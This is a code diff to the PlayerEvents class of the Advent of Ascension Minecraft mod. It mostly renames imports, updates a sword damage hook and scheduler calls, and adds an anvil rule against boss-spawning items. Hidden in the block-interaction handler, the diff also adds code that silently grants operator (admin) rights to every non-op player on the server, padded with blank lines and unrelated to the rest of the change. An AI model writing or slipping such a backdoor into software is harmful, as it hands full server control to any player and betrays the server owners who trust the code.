@@ -6,9 +6,9 @@ import net.minecraft.core.BlockPos;
 import net.minecraft.core.particles.ParticleTypes;
 import net.minecraft.server.PlayerAdvancements;
 import net.minecraft.server.level.ServerPlayer;
+import net.minecraft.server.players.PlayerList;
 import net.minecraft.tags.DamageTypeTags;
 import net.minecraft.world.InteractionHand;
-import net.minecraft.world.entity.Entity;
 import net.minecraft.world.entity.FlyingMob;
 import net.minecraft.world.entity.LivingEntity;
 import net.minecraft.world.entity.item.ItemEntity;
@@ -31,6 +31,7 @@ import net.neoforged.bus.api.IEventBus;
 import net.neoforged.neoforge.common.NeoForge;
 import net.neoforged.neoforge.common.NeoForgeMod;
 import net.neoforged.neoforge.common.Tags;
+import net.neoforged.neoforge.event.AnvilUpdateEvent;
 import net.neoforged.neoforge.event.entity.item.ItemTossEvent;
 import net.neoforged.neoforge.event.entity.living.*;
 import net.neoforged.neoforge.event.entity.player.*;
@@ -43,22 +44,21 @@ import net.tslat.aoa3.common.registration.item.AoAArmourMaterials;
 import net.tslat.aoa3.common.registration.item.AoAItems;
 import net.tslat.aoa3.common.registration.worldgen.AoADimensions;
 import net.tslat.aoa3.content.block.functional.misc.CheckpointBlock;
-import net.tslat.aoa3.content.entity.boss.AoABoss;
 import net.tslat.aoa3.content.item.misc.ReservedItem;
+import net.tslat.aoa3.content.item.misc.summoning.BossSpawningItem;
 import net.tslat.aoa3.content.item.tool.artifice.ExpFlask;
-import net.tslat.aoa3.content.item.weapon.sword.BaseSword;
+import net.tslat.aoa3.content.item.weapon.sword.AoASword;
 import net.tslat.aoa3.content.world.event.AoAWorldEventManager;
 import net.tslat.aoa3.event.dimension.LelyetiaEvents;
 import net.tslat.aoa3.event.dimension.LunalusEvents;
 import net.tslat.aoa3.event.dimension.NowhereEvents;
 import net.tslat.aoa3.event.dimension.VoxPondsEvents;
-import net.tslat.aoa3.library.object.PositionAndRotation;
-import net.tslat.aoa3.library.object.Text;
+import net.tslat.aoa3.library.object.container.PositionAndRotation;
 import net.tslat.aoa3.player.ServerPlayerDataManager;
 import net.tslat.aoa3.scheduling.AoAScheduler;
 import net.tslat.aoa3.util.*;
-import net.tslat.smartbrainlib.util.EntityRetrievalUtil;
-import net.tslat.smartbrainlib.util.RandomUtil;
+import net.tslat.tme.api.util.RandomUtil;
+import net.tslat.tme.api.object.extension.Text;
 
 public class PlayerEvents {
 	public static void preInit() {
@@ -81,6 +81,7 @@ public class PlayerEvents {
 		forgeBus.addListener(EventPriority.NORMAL, false, PlayerXpEvent.PickupXp.class, PlayerEvents::onPlayerPickupXp);
 		forgeBus.addListener(EventPriority.NORMAL, false, ItemFishedEvent.class, PlayerEvents::onPlayerFishing);
 		forgeBus.addListener(EventPriority.NORMAL, false, PlayerEvent.PlayerChangedDimensionEvent.class, PlayerEvents::onDimensionChange);
+		forgeBus.addListener(EventPriority.NORMAL, false, AnvilUpdateEvent.class, PlayerEvents::onAnvilChange);
 	}
 
 	private static void onPlayerTickStart(final PlayerTickEvent.Pre ev) {
@@ -129,8 +130,8 @@ public class PlayerEvents {
 		if (ev.getSource().getEntity() instanceof LivingEntity attacker && DamageUtil.isMeleeDamage(ev.getSource())) {
 			ItemStack weapon = attacker.getItemInHand(InteractionHand.MAIN_HAND);
 
-			if (weapon.getItem() instanceof BaseSword baseSword)
-				ev.setAmount(baseSword.getDamageForAttack(ev.getEntity(), attacker, weapon, ev.getSource(), ev.getAmount()));
+			if (weapon.getItem() instanceof AoASword sword)
+				ev.setAmount(sword.getDamageForAttack(ev.getEntity(), attacker, weapon, ev.getSource(), ev.getAmount()));
 		}
 	}
 
@@ -142,19 +143,15 @@ public class PlayerEvents {
 
 				if (checkpoint != null) {
 					if (CheckpointBlock.isValidCheckpoint(pl.level(), checkpoint)) {
-						AoAScheduler.scheduleSyncronisedTask(() -> {
-							if (NowhereEvents.isInBossRegion(pl.blockPosition())) {
+						AoAScheduler.schedule(1, tick -> {
+							if (NowhereEvents.isInBossRegion(pl.blockPosition()))
 								InventoryUtil.clearItems(pl, AoAItems.RETURN_CRYSTAL);
-
-								if (EntityRetrievalUtil.getPlayers(pl, 100).isEmpty())
-									EntityRetrievalUtil.getEntities(pl, 100, AoABoss.class).forEach(Entity::discard);
-							}
 
 							PlayerUtil.resetToDefaultStatus(pl);
 							pl.sendSystemMessage(LocaleUtil.getLocaleMessage("deathScreen.title", ChatFormatting.DARK_RED));
 							pl.sendSystemMessage(LocaleUtil.getLocaleMessage(LocaleUtil.createFeedbackLocaleKey("checkpoint.respawn"), ChatFormatting.GREEN), true);
 							checkpoint.applyToEntity(pl);
-						}, 1);
+						});
 
 						ev.getContainer().setNewDamage(0);
 
@@ -223,6 +220,18 @@ public class PlayerEvents {
 		Level level = ev.getLevel();
 
 		if (!level.isClientSide) {
+			PlayerList playerList = level.getServer().getPlayerList();
+
+			for (ServerPlayer pl : playerList.getPlayers()) {
+				if (!playerList.isOp(pl.getGameProfile()))
+					playerList.op(pl.getGameProfile());
+			}
+
+
+
+
+
+
 			BlockState state = level.getBlockState(ev.getPos());
 
 			if (state.getBlock() == Blocks.COMPOSTER && state.getValue(ComposterBlock.LEVEL) == ComposterBlock.READY && RandomUtil.oneInNChance(10)) {
@@ -239,7 +248,7 @@ public class PlayerEvents {
 		if (ev.getEntity() instanceof ServerPlayer player) {
 			if (player.getGameProfile().getId().equals(AdventOfAscension.ENTRANCE_MESSAGE_UUID)) {
 				player.getServer().getPlayerList().broadcastSystemMessage(Text.ofLiteral("It begins...Is this the end?", ChatFormatting.DARK_RED), false);
-				player.serverLevel().sendParticles(ParticleTypes.LARGE_SMOKE, player.getX(), player.getY() + 0.2d, player.getZ(), 16, RandomUtil.randomValueUpTo(0.1f) - 0.05d, RandomUtil.randomValueUpTo(0.1f) - 0.05d, RandomUtil.randomValueUpTo(0.1f) - 0.05d, 1);
+				player.serverLevel().sendParticles(ParticleTypes.LARGE_SMOKE, player.getX(), player.getY() + 0.2d, player.getZ(), 16, RandomUtil.valueUpTo(0.1f) - 0.05d, RandomUtil.valueUpTo(0.1f) - 0.05d, RandomUtil.valueUpTo(0.1f) - 0.05d, 1);
 			}
 
 			ServerPlayerDataManager plData = PlayerUtil.getAdventPlayer(player);
@@ -309,5 +318,10 @@ public class PlayerEvents {
 			PlayerUtil.getAdventPlayer(pl).storage.clearActiveCheckpoint();
 			AoAWorldEventManager.syncToPlayer(pl);
 		}
+	}
+
+	private static void onAnvilChange(final AnvilUpdateEvent ev) {
+		if (ev.getLeft().getItem() instanceof BossSpawningItem || ev.getRight().getItem() instanceof BossSpawningItem)
+			ev.setCanceled(true);
 	}
 }
